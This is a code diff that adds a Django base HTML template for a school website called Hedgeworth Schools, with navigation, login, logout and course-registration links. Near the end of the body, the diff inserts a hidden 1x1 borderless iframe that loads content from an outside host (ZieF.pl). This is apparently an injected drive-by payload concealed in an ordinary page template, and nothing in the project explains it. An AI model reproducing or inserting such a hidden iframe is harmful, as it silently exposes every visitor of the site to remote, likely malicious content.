@@ -1,0 +1,56 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8" name="viewport" content="width = device-width, initial-scale=1.0">
+    <title>Hedgeworth Schools</title>
+    <link rel="stylesheet" href="/static/styles.css" href="{% static 'bootstrap.min.css' %}">
+  </head>
+   <body>
+    <div>
+    <header class = "wrapper">
+    <a href="{% url 'homepage' %}"><img src="{% static 'hedgeworth logo.png' %}"></a>
+       <nav>   
+        <li>
+          <a href="{% url 'homepage' %}">Home</a>
+        </li>
+
+        <li>
+          <a href="{% url 'about' %}">About</a>
+        </li>
+            
+        <ul>
+
+          {% if user.is_authenticated %}
+          <li>
+            <form class = "logout-link" action = "{% url 'accounts:logout' %}" method="post">
+              {%csrf_token%}
+              <button type="submit">Logout</button>
+            </form> 
+          </li>
+          <li><a href ="{% url 'coursereg:course_create' %}" class= "highlight" > Add New Course</a></li>
+          {% else %}
+
+         <li> 
+          <a  href="{% url 'accounts:login' %}">Login</a>
+        </li>
+        <li><a href="{% url 'accounts:register' %}">Register</a></li>
+          {% endif %}
+        </ul>
+      </nav>
+      </header>
+
+     </div>    
+    <div class ="wrapper"> 
+      {% block content %}
+
+      {% endblock %} 
+    </div> 
+
+
+
+<script src="{% static 'bootstrap.min.js' %}"></script>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+<script src="{% static 'bootstrap.min.js' %}"></script>
+</html>
